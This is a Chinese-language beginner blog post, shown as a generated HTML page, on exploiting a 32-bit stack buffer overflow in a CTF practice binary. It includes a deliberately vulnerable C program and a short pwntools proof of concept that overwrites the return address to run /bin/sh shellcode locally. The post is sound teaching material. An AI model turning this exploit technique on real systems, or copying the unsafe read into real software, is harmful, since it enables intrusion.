@@ -1,0 +1,709 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言终于开始写技术文了，内心很激动，不过这个东西还是研究蛮久的，这篇文章也算非常基础的文章了吧，经常看别的大佬写一些ctf的wp感觉我这种文章就太水了，不过我尽可能写好吧，也算自己学习的总结，之前没人教，全靠自己领悟，说实话那个时候真的痛苦，不过其实理解到了就还好吧。 从一个小程序开始12345678910void fun()&amp;#123;    char buffer[0x20];    read">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从栈溢出到getshell">
+<meta property="og:url" content="http://yoursite.com/2018/09/03/从栈溢出到getshell/index.html">
+<meta property="og:site_name" content="Binarever">
+<meta property="og:description" content="前言终于开始写技术文了，内心很激动，不过这个东西还是研究蛮久的，这篇文章也算非常基础的文章了吧，经常看别的大佬写一些ctf的wp感觉我这种文章就太水了，不过我尽可能写好吧，也算自己学习的总结，之前没人教，全靠自己领悟，说实话那个时候真的痛苦，不过其实理解到了就还好吧。 从一个小程序开始12345678910void fun()&amp;#123;    char buffer[0x20];    read">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2018/09/03/从栈溢出到getshell/2.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/03/从栈溢出到getshell/3.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/03/从栈溢出到getshell/1.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/03/从栈溢出到getshell/4.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/03/从栈溢出到getshell/5.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/03/从栈溢出到getshell/6.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/03/从栈溢出到getshell/7.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/03/从栈溢出到getshell/8.png">
+<meta property="og:updated_time" content="2018-09-04T09:17:00.070Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="从栈溢出到getshell">
+<meta name="twitter:description" content="前言终于开始写技术文了，内心很激动，不过这个东西还是研究蛮久的，这篇文章也算非常基础的文章了吧，经常看别的大佬写一些ctf的wp感觉我这种文章就太水了，不过我尽可能写好吧，也算自己学习的总结，之前没人教，全靠自己领悟，说实话那个时候真的痛苦，不过其实理解到了就还好吧。 从一个小程序开始12345678910void fun()&amp;#123;    char buffer[0x20];    read">
+<meta name="twitter:image" content="http://yoursite.com/2018/09/03/从栈溢出到getshell/2.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/09/03/从栈溢出到getshell/"/>
+
+
+
+
+
+  <title>从栈溢出到getshell | Binarever</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Binarever</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/03/从栈溢出到getshell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Binarever">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Binarever">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">从栈溢出到getshell</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-03T16:34:31+08:00">
+                2018-09-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>终于开始写技术文了，内心很激动，不过这个东西还是研究蛮久的，这篇文章也算非常基础的文章了吧，经常看别的大佬写一些ctf的wp感觉我这种文章就太水了，不过我尽可能写好吧，也算自己学习的总结，之前没人教，全靠自己领悟，说实话那个时候真的痛苦，不过其实理解到了就还好吧。</p>
+<h1 id="从一个小程序开始"><a href="#从一个小程序开始" class="headerlink" title="从一个小程序开始"></a>从一个小程序开始</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">void <span class="function"><span class="title">fun</span></span>()&#123;</span><br><span class="line">    char buffer[0x20];</span><br><span class="line">    <span class="built_in">read</span>(0,buffer,0x100);</span><br><span class="line">    write(1,buffer,0x100);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()&#123;</span><br><span class="line">    fun();</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个程序了解过相关知识的人看一眼就知道有问题，就准备开始写poc了，一分钟之后，就getshell了。我们可以看一看哈，这个main函数调用了fun函数，而这个fun函数先定义了一个长度为0x20也就是32字节的字符数组buffer，而后又立刻使用read函数让用户对buffer数组进行赋值，不过问题就在这个长度上面。你看，这个buffer数组我之前说它长度是0x20也就是16X2=32字节，但是我可以通过read函数往里写0x100也就是16X16=256个字节，那么这就会导致数组赋值后越界对吧。所以，当这种情况发生时，我们就称它叫缓冲区溢出，这种形式的叫栈溢出。</p>
+<h1 id="数据结构-栈"><a href="#数据结构-栈" class="headerlink" title="数据结构-栈"></a>数据结构-栈</h1><p>这个刚才提到这个栈哈，一种数据结构，刚学c语言可能只学语法，不太了解这个栈是个什么东西，百度一下其实就基本可以知道了，我简单讲解一下哈，这个栈是先进后出，就跟往木桶里面放东西一样，最先放进去的最后拿出来，在汇编里面经常会有push,pop这样的关键字，就是在对参数进行入栈出栈，举个栗子</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push ecx</span><br></pre></td></tr></table></figure>
+<p>这个指令，就是把ecx这个寄存器里面保存的值，进栈。至于ecx寄存器啥的就百度或者看看汇编吧，实在不行就编个程序调一下，就可以理解了。现在我就从汇编的指令上讲解一下这个程序的调用吧，当需要调用这个函数的时候，就会出现栈操作中的push传参，call指令调用函数，eip跳转到函数所在位置，然后开始执行对栈的操作。比如说：</p>
+<p><img src="/2018/09/03/从栈溢出到getshell/2.png" alt=""></p>
+<p>当call指令执行之后，栈中就是这样：</p>
+<p><img src="/2018/09/03/从栈溢出到getshell/3.png" alt=""></p>
+<p>esp在栈顶，而这个地方存的值就是main+11，0x8048496，也就是返回地址，后面会提到，然后进入fun函数操作：</p>
+<p><img src="/2018/09/03/从栈溢出到getshell/1.png" alt=""></p>
+<p>我们可以看到eip指向函数开始执行指令后，通常第一件事都是这样，对esp，ebp这个栈顶栈底操作后自然地开辟出了一片内存单元，对的，这就是栈，而在ebp的下面一个单元，保存的就是返回地址，就是母函数的调用出的地址加4(32位)，当函数完了就有个ret，目的就是吧这个地址弹到eip中，继续执行母函数的指令。</p>
+<h1 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h1><p>既然栈的结构和机制是这样，那么想必聪明的你应该想到攻击方法了吧。就拿我这个栗子来说，栈的布局是这样：</p>
+<p><img src="/2018/09/03/从栈溢出到getshell/4.png" alt=""></p>
+<p>那么，我们完全可以让这个变量溢出，一直覆盖掉这个返回地址，将他改为我shellcode的地址就可以拿到shell了对吧。</p>
+<p>这个shellcode啊，也挺有意思的，就是一段可以获取主机控制权限的字节码，很短，可以这样理解，只要eip指向这段代码一运行，就可以拿shell了。</p>
+<p>好，因为这个栗子具有一定的局限性，无法泄露地址，我们换一个例子，这是我之前做过的一道题：</p>
+<p><img src="/2018/09/03/从栈溢出到getshell/5.png" alt=""></p>
+<p>现在它用IDA打开很容易就能看到伪c代码，而且现在这个程序是刻意打印了一个地址，是这个数组在栈中的地址，所以我们既然得到了地址，也就是说这个程序有地址泄露，然后我们可以通过工具checksec查看一下防御机制，当然这个肯定是几乎全关的：</p>
+<p><img src="/2018/09/03/从栈溢出到getshell/6.png" alt=""></p>
+<p>所以我们可以直接发送shellcode到这个栈中，并且数组溢出到后面覆盖返回地址，将返回地址改为这个shellcode的所在地址就可以让这个程序在ret指令之后shellcode的地址会弹到eip中从而执行shellcode对吧。</p>
+<p>poc</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">shell_code = shellcraft.i386.sh()</span><br><span class="line">shell_code = asm(shell_code)</span><br><span class="line">conn = process(<span class="string">'./pwn2'</span>)</span><br><span class="line">addr = conn.recvline()</span><br><span class="line">add = int(addr[2:],16)</span><br><span class="line">shellcode_add = p32(add + 32 + 4)</span><br><span class="line">v = 32*<span class="string">"a"</span> + shellcode_add + shell_code</span><br><span class="line">conn.send(v+<span class="string">"\n"</span>)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+<p>最后就是这样了</p>
+<p><img src="/2018/09/03/从栈溢出到getshell/7.png" alt=""></p>
+<h1 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h1><p>当然这个poc不是我写的，不过我们理解一下哈，前面两行是我们生成shellcode的过程，就不说了，第三行是执行pwn2程序，第四行是接收程序发送的buf地址，然后我们对这个地址进行处理，先把0x去掉，然后从字符串转换成16进制int类型的数字，然后加上缓冲区大小，这个我们其实可以通过IDA查看也可以通过gdb+cyclic工具测试出来：</p>
+<p><img src="/2018/09/03/从栈溢出到getshell/8.png" alt=""></p>
+<p>然后在加一个返回地址的大小就可以了，这就作为返回地址的值，放在32个”a”之后，在加上shellcode，发送。就成功拿到shell了。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这篇文章还是花了我一些时间，同时我也又一次复习了一下，还是不错的，说实话，这个文章可能大佬们看了不觉得什么，但是说实话如果我在非常菜的时候看到这样一篇文章，我觉得真的会很开心，这样我觉得也就能达到我的目的，实现我的价值了，我本来就很菜，让我写文章给这些大佬看怕是打扰了，所以说文章可能并不高端，但是还是应该会有一定的意义吧，不管是比赛还是真实的场景都不可能出现上面这些栗子这种场景，真实的cvewindows栈溢出啥的10年都是文件类型的了，更别提linux的了，再加上各种防御机制，所以后面还会慢慢做这个防御机制的绕过，别急哈。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/08/30/ubuntu搭建pwn环境/" rel="next" title="ubuntu搭建pwn环境">
+                <i class="fa fa-chevron-left"></i> ubuntu搭建pwn环境
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Binarever</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#从一个小程序开始"><span class="nav-number">2.</span> <span class="nav-text">从一个小程序开始</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#数据结构-栈"><span class="nav-number">3.</span> <span class="nav-text">数据结构-栈</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#开始攻击"><span class="nav-number">4.</span> <span class="nav-text">开始攻击</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#理解"><span class="nav-number">5.</span> <span class="nav-text">理解</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">6.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Binarever</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
